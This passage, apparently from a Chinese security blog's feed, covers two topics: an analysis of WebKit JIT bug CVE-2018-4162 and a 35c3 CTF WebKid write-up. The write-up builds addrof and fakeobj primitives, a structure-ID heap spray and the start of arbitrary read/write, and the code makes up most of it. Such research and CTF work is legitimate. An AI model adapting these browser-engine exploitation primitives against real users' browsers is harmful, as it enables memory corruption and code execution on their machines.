class="number">1.1</span>;</span><br><span class="line">    a[<span class="number">1</span>] = <span class="number">2.2</span>;</span><br><span class="line">    c == o;</span><br><span class="line">    a[<span class="number">2</span>] = <span class="number">5.607070584648226e-310</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">    go(arr, &#123;&#125;);</span><br><span class="line">&#125;</span><br><span class="line">go(arr, &#123; <span class="attr">toString</span>: <span class="function"><span class="params">()</span> =&gt;</span> &#123; arr[<span class="number">0</span>] = &#123;&#125;; <span class="keyword">return</span> <span class="string">'1'</span>; &#125; &#125;);</span><br><span class="line"><span class="string">""</span> + arr[<span class="number">2</span>];</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//StringIdent -- no callback</span></span><br><span class="line"><span class="comment">//39:&lt; 1:loc7&gt;CompareEq(Check:StringIdent:@38, StringIdent:@35, Boolean|PureInt, Bool, Exits, bc#32, ExitValid)</span></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">arr[<span class="string">'a'</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> s = <span class="string">"astring"</span>;</span><br><span class="line"><span class="keyword">let</span> go = <span class="function"><span class="keyword">function</span> (<span class="params">a, c</span>) </span>&#123;</span><br><span class="line">    a[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line">    a[<span class="number">1</span>] = <span class="number">2.2</span>;</span><br><span class="line">    c == s;</span><br><span class="line">    a[<span class="number">2</span>] = <span class="number">5.607070584648226e-310</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">    go(arr, <span class="string">"bstring"</span>);</span><br><span class="line">&#125;</span><br><span class="line">go(arr, &#123; <span class="attr">toString</span>: <span class="function"><span class="params">()</span> =&gt;</span> &#123; arr[<span class="number">0</span>] = &#123;&#125;; <span class="keyword">return</span> <span class="string">'cstring'</span>; &#125; &#125;);</span><br><span class="line"><span class="string">""</span> + arr[<span class="number">2</span>];</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> SpeculativeJIT::compare(Node* node, MacroAssembler::RelationalCondition condition, MacroAssembler::DoubleCondition doubleCondition, S_JITOperation_EJJ operation)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (compilePeepHoleBranch(node, condition, doubleCondition, operation)) <span class="comment">//======== operation</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (node-&gt;isBinaryUseKind(Int32Use)) &#123;</span><br><span class="line">        compileInt32Compare(node, condition);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE(JSVALUE64)</span></span><br><span class="line">    <span class="keyword">if</span> (node-&gt;isBinaryUseKind(Int52RepUse)) &#123;</span><br><span class="line">        compileInt52Compare(node, condition);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// USE(JSVALUE64)</span></span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (node-&gt;isBinaryUseKind(DoubleRepUse)) &#123;</span><br><span class="line">        compileDoubleCompare(node, doubleCondition);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (node-&gt;isBinaryUseKind(StringUse)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (node-&gt;op() == CompareEq)</span><br><span class="line">            compileStringEquality(node);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            compileStringCompare(node, condition);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (node-&gt;isBinaryUseKind(StringIdentUse)) &#123;      <span class="comment">//================&gt; no operation as callback</span></span><br><span class="line">        <span class="keyword">if</span> (node-&gt;op() == CompareEq)</span><br><span class="line">            compileStringIdentEquality(node);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            compileStringIdentCompare(node, condition);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (node-&gt;op() == CompareEq) &#123;</span><br><span class="line">        <span class="keyword">if</span> (node-&gt;isBinaryUseKind(BooleanUse)) &#123;</span><br><span class="line">            compileBooleanCompare(node, condition);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (node-&gt;isBinaryUseKind(SymbolUse)) &#123;</span><br><span class="line">            compileSymbolEquality(node);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (node-&gt;isBinaryUseKind(ObjectUse)) &#123;       <span class="comment">//================&gt; no operation as callback</span></span><br><span class="line">            compileObjectEquality(node);              </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h4 id="3-2-CompareEq的UseKind由DFGFixupPhase确定"><a href="#3-2-CompareEq的UseKind由DFGFixupPhase确定" class="headerlink" title="3.2 CompareEq的UseKind由DFGFixupPhase确定"></a>3.2 CompareEq的UseKind由DFGFixupPhase确定</h4><p>根据源码，CompareEq的默认UseKind都是Untyped，这一步由DFGByteCodeParser决定：</p><p><img src="CVE-2018-4162 CompareEq side effect.assets/image-20190119133546797.png" alt="image-20190119133546797"></p><p><img src="CVE-2018-4162 CompareEq side effect.assets/image-20190119133623857.png" alt="image-20190119133623857"></p><p>UseKind在fixup phase里可以被修改，寻找线索的三种方法：</p><ul><li>搜索“ = UntypedUse”</li><li>使用watchpoint调试跟踪</li><li>dumpGraphAtEachPhase</li></ul><p><img src="CVE-2018-4162 CompareEq side effect.assets/image-20190119133823501.png" alt="image-20190119133823501"></p><p>其中泛型UseKind11是ObjectUse。</p><p><img src="CVE-2018-4162 CompareEq side effect.assets/image-20190119133901074.png" alt="image-20190119133901074"></p><p>而代码要求，必须child1、child2的SpeculatedType均为object时才会设置UseKind为ObjectUse。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">shouldSpeculateObject</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> isObjectSpeculation(prediction());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">SpeculatedType <span class="title">prediction</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_prediction;</span><br><span class="line">    &#125;</span><br><span class="line">    SpeculatedType m_prediction &#123; SpecNone &#125;; (struct Node/DFGNode.h)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">isObjectSpeculation</span><span class="params">(SpeculatedType value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> !!(value &amp; SpecObject) &amp;&amp; !(value &amp; ~SpecObject);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h3><ul><li><p>DFG JIT的实现代码犹如草蛇灰线，伏脉千里。安全研究员提出修补建议、官方修补漏洞时都可能忽略一些问题，造成修补的反复进行。</p></li><li><p>在3.1节中，IR结点的UseKind决定编译结果是否含有回调，因而不妨作为“DFG回调副作用”这一pattern挖掘的核心和Entry Point。</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、从ZDI文章开始&quot;&gt;&lt;a href=&quot;#一、从ZDI文章开始&quot; class=&quot;headerlink&quot; title=&quot;一、从ZDI文章开始&quot;&gt;&lt;/a&gt;一、从ZDI文章开始&lt;/h3&gt;&lt;p&gt;2018年4月，ZDI发表了《INVERTING YOUR ASSUMPTI
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>35c3CTF WebKid writeup heuristic transition</title>
    <link href="https://dwfault.github.io/2019/12/20/35c3CTF%20WebKid%20writeup%20heuristic%20transition/"/>
    <id>https://dwfault.github.io/2019/12/20/35c3CTF WebKid writeup heuristic transition/</id>
    <published>2019-12-20T04:13:28.623Z</published>
    <updated>2019-12-20T04:13:28.623Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、patch简述"><a href="#一、patch简述" class="headerlink" title="一、patch简述"></a>一、patch简述</h3><p><a href="https://github.com/saelo/35c3ctf/blob/master/WebKid/webkid.patch" target="_blank" rel="noopener">https://github.com/saelo/35c3ctf/blob/master/WebKid/webkid.patch</a></p><p><img src="35c3CTF WebKid writeup heuristic transition.assets/image-20190108133641498-6925801.png" alt="image-20190108133641498"></p><p>一个patch就足够了。patch的核心在于给操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">thisObject-&gt;setStructure(vm, Structure::removePropertyTransition(vm, structure, propertyName, offset));</span><br></pre></td></tr></table></figure><p>增加了一个fast path。在这个fast path中，假如delete的property是最后一个添加的就把它删去，然后把structureID恢复到上一个。</p><p>对比一下正常的行为：</p><p><img src="35c3CTF WebKid writeup heuristic transition.assets/image-20190108134735998-6926456.png" alt="image-20190108134735998"></p><ul><li><p>patch之前的版本：<br>Object: 0x11cdc8580 with butterfly 0x18000fe5c8 (Structure 0x11cdf2760:[Array, {}, ArrayWithDouble, Proto:0x11cdb4090, Leaf]), StructureID: 91</p><p>Object: 0x11cdc8580 with butterfly 0x18000f8468 (Structure 0x11cda7c60:[Array, {outOfLineProperty:100}, ArrayWithDouble, Proto:0x11cdb4090, Leaf]), StructureID: 282</p><p>Object: 0x11cdc8580 with butterfly 0x18000f8468 (Structure 0x11cda7cd0:[Array, {}, ArrayWithDouble, Proto:0x11cdb4090, UncacheableDictionary, Leaf]), StructureID: 283  </p><ul><li>delete outOfLineProperty之后StructureID从282增长到283。</li></ul></li><li><p>patch之后的版本：<br>Object: 0x11cdc8580 with butterfly 0xc000fe5c8 (Structure 0x11cdf2760:[Array, {}, ArrayWithDouble, Proto:0x11cdb4090, Leaf]), StructureID: 91<br>Object: 0x11cdc8580 with butterfly 0xc000f8468 (Structure 0x11cda7c60:[Array, {outOfLineProperty:100}, ArrayWithDouble, Proto:0x11cdb4090, Leaf]), StructureID: 282<br>Object: 0x11cdc8580 with butterfly 0xc000f8468 (Structure 0x11cdf2760:[Array, {}, ArrayWithDouble, Proto:0x11cdb4090]), StructureID: 91</p><ul><li>delete outOfLineProperty之后StructureID从282回到了之前的91。</li></ul></li></ul><p>一说到structureID的改变，就想到DFG JIT中watchpoint(CodeBlockJettisoningWatchpoint)的fire是靠不同的structure来触发的，一个最简单的原语：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">primitiveMaybeNotExploitable</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">    arr.outOfLineProperty = obj;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">visit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> arr.outOfLineProperty;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++) &#123;</span><br><span class="line">        visit();</span><br><span class="line">    &#125;</span><br><span class="line">    print(describe(arr));</span><br><span class="line">    <span class="comment">//Object: 0x11cdc8580 with butterfly 0x18000f8468 (Structure 0x11cda7c60:[Array, &#123;outOfLineProperty:100&#125;, ArrayWithDouble, Proto:0x11cdb4090, Leaf]), StructureID: 282</span></span><br><span class="line">    <span class="keyword">delete</span> arr.outOfLineProperty;</span><br><span class="line">    print(describe(arr));</span><br><span class="line">    <span class="comment">//Object: 0x11cdc8580 with butterfly 0x18000f8468 (Structure 0x11cdf2760:[Array, &#123;&#125;, ArrayWithDouble, Proto:0x11cdb4090]), StructureID: 91</span></span><br><span class="line">    <span class="keyword">return</span> visit();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> o = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> res = primitiveMaybeNotExploitable(o);</span><br><span class="line">print(res);</span><br><span class="line"><span class="comment">//[Object Object]</span></span><br></pre></td></tr></table></figure><p>DFG生成的visit()函数在最后一次执行前，structureID为91，按理说已经不包含outOfLineProperty，但由于没有触发watchpoint，代码逻辑没有发生改变，而且butterfly指针保留，仍然能获得相应的引用。这是一个问题，但应该无法做到漏洞利用。</p><p>而正常版本的deleteProperty显然会触发watchpoint，最后得出结果是undefined：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Firing watchpoint 0x11c84d0a0 on visit<span class="comment">#ETPOUh:[0x11cd784c0-&gt;0x11cd78260-&gt;0x11cd98f20, DFGFunctionCall, 35]</span></span><br><span class="line"></span><br><span class="line">Jettisoning visit<span class="comment">#ETPOUh:[0x11cd784c0-&gt;0x11cd78260-&gt;0x11cd98f20, DFGFunctionCall, 35] and counting reoptimization due to UnprofiledWatchpoint, Structure transition from 0x11cda7c60:[Array, &#123;outOfLineProperty:100&#125;, ArrayWithDouble, Proto:0x11cdb4090, Shady leaf].</span></span><br></pre></td></tr></table></figure><p><img src="35c3CTF WebKid writeup heuristic transition.assets/image-20190108142505592-6928705.png" alt="image-20190108142505592"></p><p>栈回溯的第12条是原版代码中被fast path越过的代码。removePropertyTransition才是用来触发WatchpointSet::fireAll的函数调用，而patch中只是简单地设置了：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">thisObject-&gt;setStructure(vm, previous);</span><br></pre></td></tr></table></figure><h3 id="二、primitive构造"><a href="#二、primitive构造" class="headerlink" title="二、primitive构造"></a>二、primitive构造</h3><p>WatchPointSet是通过structure对象索引的，structure对象由structureID确定，因此一个structureID对应一个WatchPointSet。在第一部分的visit()函数中，DFG插入Watchpoint时，arr的类型是ArrayWithDouble并附加一个outOfLineProperty，structureID是282。也就是说WatchPointSet对应strucutre282，那么之后变成structure91之后是没有注册WatchPointSet的，如果再次进行类型转换，仍然不会fire。</p><p><img src="35c3CTF WebKid writeup heuristic transition.assets/image-20190108144723764-6930043.png" alt="image-20190108144723764"></p><p>(如果struture91被注册了WatchPointSet，在654行会进行fire)</p><p>因此再给代码增加一个transition，用传统的convertDoubleToContiguous：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">primitiveAddrOf</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">    arr.outOfLineProperty = <span class="number">4.4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">visit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> arr[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++) &#123;</span><br><span class="line">        visit();</span><br><span class="line">    &#125;</span><br><span class="line">    print(describe(arr));</span><br><span class="line">    <span class="comment">//Object: 0x11cdc8580 with butterfly 0x18000f8468 (Structure 0x11cda7c60:[Array, &#123;outOfLineProperty:100&#125;, ArrayWithDouble, Proto:0x11cdb4090, Leaf]), StructureID: 282</span></span><br><span class="line">    <span class="keyword">delete</span> arr.outOfLineProperty;</span><br><span class="line">    print(describe(arr));</span><br><span class="line">    <span class="comment">//Object: 0x11cdc8580 with butterfly 0x18000f8468 (Structure 0x11cdf2760:[Array, &#123;&#125;, ArrayWithDouble, Proto:0x11cdb4090]), StructureID: 91</span></span><br><span class="line">    arr[<span class="number">0</span>] = obj;</span><br><span class="line">    print(describe(arr));</span><br><span class="line">    <span class="comment">//Object: 0x11cdc8580 with butterfly 0x18000f8468 (Structure 0x11cdf27d0:[Array, &#123;&#125;, ArrayWithContiguous, Proto:0x11cdb4090]), StructureID: 92</span></span><br><span class="line">    <span class="keyword">return</span> visit();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> o = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> res = primitiveAddrOf(o);</span><br><span class="line">print(res);</span><br><span class="line"><span class="comment">//2.3570356407e-314</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">primitiveFakeObj</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">    arr.outOfLineProperty = <span class="number">4.4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> value = addr;</span><br><span class="line">    <span class="keyword">let</span> res = arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">assign</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr[<span class="number">0</span>] = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++) &#123;</span><br><span class="line">        assign();</span><br><span class="line">    &#125;</span><br><span class="line">    print(describe(arr));</span><br><span class="line">    <span class="comment">//Object: 0x11cdc85a0 with butterfly 0x8000f8468 (Structure 0x11cda7c60:[Array, &#123;outOfLineProperty:100&#125;, ArrayWithDouble, Proto:0x11cdb4090, Leaf]), StructureID: 282</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span> arr.outOfLineProperty;</span><br><span class="line">    print(describe(arr));</span><br><span class="line">    <span class="comment">//Object: 0x11cdc85a0 with butterfly 0x8000f8468 (Structure 0x11cdf2760:[Array, &#123;&#125;, ArrayWithDouble, Proto:0x11cdb4090]), StructureID: 91</span></span><br><span class="line"></span><br><span class="line">    arr[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">    print(describe(arr));</span><br><span class="line">    <span class="comment">//Object: 0x11cdc85a0 with butterfly 0x8000f8468 (Structure 0x11cdf27d0:[Array, &#123;&#125;, ArrayWithContiguous, Proto:0x11cdb4090]), StructureID: 92</span></span><br><span class="line"></span><br><span class="line">    assign();</span><br><span class="line">    <span class="keyword">return</span> arr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> obj = primitiveFakeObj(res);</span><br><span class="line">print(obj);</span><br><span class="line"><span class="comment">//[object Object]</span></span><br><span class="line">print(describe(obj));</span><br><span class="line"><span class="comment">//Object: 0x11c5b0080 with butterfly 0x0 (Structure 0x11c5f1dc0:[Object, &#123;&#125;, NonArray, Proto:0x11c5c8020]), StructureID: 69</span></span><br></pre></td></tr></table></figure><p>于是我们有了两个原语，addrof、fakeobj。</p><h3 id="三、全局读写构造"><a href="#三、全局读写构造" class="headerlink" title="三、全局读写构造"></a>三、全局读写构造</h3><p>addof、fakeobj之后，构造全局读写还是比较简单的，基本有模版可参考：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> BASE32 = <span class="number">0x100000000</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fu</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">    f64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> i32[<span class="number">0</span>] + BASE32 * i32[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uf</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">    i32[<span class="number">0</span>] = i % BASE32;</span><br><span class="line">    i32[<span class="number">1</span>] = i / BASE32;</span><br><span class="line">    <span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> conversionBuffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">let</span> f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(conversionBuffer);</span><br><span class="line"><span class="keyword">let</span> i32 = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(conversionBuffer);</span><br><span class="line"></span><br><span class="line">i32[<span class="number">0</span>] = <span class="number">0x0fffffff</span>;</span><br><span class="line">i32[<span class="number">1</span>] = <span class="number">0x0fffffff</span> - <span class="number">0x10000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> pvLength = f64[<span class="number">0</span>];  <span class="comment">//0x0fffffff0fffffff adjacent public/vector length.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> structureIDSprayArray = [];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sprayRWProxy</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> o = &#123; <span class="attr">a</span>: <span class="number">0xa</span>, <span class="attr">b</span>: <span class="number">0xb</span>, <span class="attr">c</span>: pvLength &#125;;</span><br><span class="line">        o[<span class="number">0</span>] = <span class="number">0.1</span>;</span><br><span class="line">        o[<span class="number">1</span>] = <span class="number">1.1</span>;</span><br><span class="line">        o[<span class="string">'outOfLineProperty_'</span> + i.toString(<span class="number">16</span>)] = <span class="number">2.1</span>;</span><br><span class="line">        <span class="comment">//print(describe(o));</span></span><br><span class="line">        <span class="comment">//dbg(0);</span></span><br><span class="line">        structureIDSprayArray.push(o); <span class="comment">//structureID capacity would be above 0x1000;</span></span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0xfff</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> o;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> rwProxy = sprayRWProxy();<span class="comment">//rwProxy is NonArrayWithDouble</span></span><br><span 